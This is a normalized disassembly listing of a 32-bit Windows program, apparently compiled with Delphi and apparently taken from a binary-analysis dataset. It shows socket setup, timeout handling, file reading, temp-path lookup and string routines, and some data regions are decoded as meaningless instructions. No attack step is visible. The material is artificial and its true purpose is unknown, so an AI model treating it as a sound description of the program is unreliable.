add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_461667
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403f4c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46166e
lea eax [ ebp - 0x1c ]
call sub_403ef8
retn
sub_461678
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_4041b8
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_461268
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4616f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_461268
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_461740
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_4043b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_460b64
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46179c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_4043b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4040f0
or edx 0xffffffff
mov eax esi
call sub_460b64
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4617ec
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_404544
mov eax [ ebx ]
call sub_4041b8
push eax
mov eax [ ebx ]
call sub_4043b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_4043b8
mov edx eax
mov eax ebx
call sub_4040f0
pop ebx
retn
sub_461834
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_461850
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4618db
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403f4c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4618e2
lea eax [ ebp - 0x1c ]
call sub_403ef8
retn
sub_4618ec
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_4142c4
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413fac
add ebx 0x4
dec esi
jne r-xdata
sub_461928
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4619bd
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4619c4
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_414108
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_4619cc
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b40
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b40
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b40
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_461928
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_461928
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_461928
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4618ec
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4618ec
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4618ec
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_461ae4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_461b00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b40
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_461268
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_461b6c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_461b8c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0xc ] eax
sub_461bec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_461cb9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_4036f0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_407fd0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461cc0
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
sub_461cdf
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_461de9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404eb8
xor eax eax
push ebp
push sub_461dae
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_4040f0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_404ef4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461df0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404eb8
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4040f0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_461db3
mov eax [ ebp - 0x4 ]
call sub_403124
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461df0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404eb8
retn
sub_461e14
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_461eae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_4043b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_460b64
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461eb5
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f1c
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_461ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_461ed8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_461f8e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461f71
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f78
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_461fa0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_462063
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
mov eax [ ebp - 0x8 ]
call sub_407fd0
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
mov eax [ ebp - 0xc ]
call sub_407fd0
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
mov eax [ ebp - 0x10 ]
call sub_407fd0
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4628b8
mov eax [ ebp - 0x14 ]
call sub_407fd0
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46206a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f1c
retn
sub_462088
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462116
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_460b64
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f4c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46211d
lea eax [ ebp - 0x18 ]
call sub_403ef8
retn
sub_462128
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4621b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_460b64
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f4c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4621bd
lea eax [ ebp - 0x18 ]
call sub_403ef8
retn
sub_4621c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_4621e8
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_462242
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462249
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_462250
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_4622aa
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4622b1
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_4622b8
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_4622ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46238d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_460d28
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462394
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408d28
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f4c
sub_46239c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4623d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623dc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_46240c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462431
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462438
retn
sub_46251f
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ 0x10030046 ] ch
push esp
dec ecx
dec ebp
popad
js r-xdata
dec ecx
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ch
and eax 0x6d0b0046
popad
inc ebp
js r-xdata
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c344
pop esi
pop ebx
retn
jo r-xdata
mov eax edx
retn
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
retn 0x90c3
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
nop
and eax 0x3110046
xor [ cs : ecx ] dh
add al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] ch
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
insb
and eax 0x2110046
cmp [ cs : eax + eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] ch
sub_4626b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46270f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_404544
mov eax [ ebx ]
call sub_4043b8
push eax
mov eax [ ebx ]
call sub_4041b8
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_404544
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_4625b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462716
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_46271c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4627bd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov esi eax
cmp ebx 0xffffffff
jne r-xdata
mov eax edi
call sub_4041b8
sub eax esi
inc eax
cmp ebx eax
jge r-xdata
mov eax edi
call sub_4041b8
mov ebx eax
mov eax edi
call sub_4041b8
sub eax esi
inc eax
mov eax ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4627c4
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_404418
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407d5c
test al al
je r-xdata
mov ebx eax
cmp ebx 0x1
jl r-xdata
dec ebx
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
sub_4627d0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_462899
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404304
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407b44
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407b44
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_4044fc
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404418
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f4c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4628a0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f1c
retn
push ebx
mov eax edi
call sub_4041b8
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404418
mov eax ebx
call sub_403ef8
jmp r-xdata
sub_4628b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_4627d0
mov eax esi
mov edx r-xdata
call sub_404304
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_4044fc
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404418
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f4c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_4041b8
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404418
jmp r-xdata
mov eax ebx
call sub_403ef8
jmp r-xdata
sub_4629a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_4041b8
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
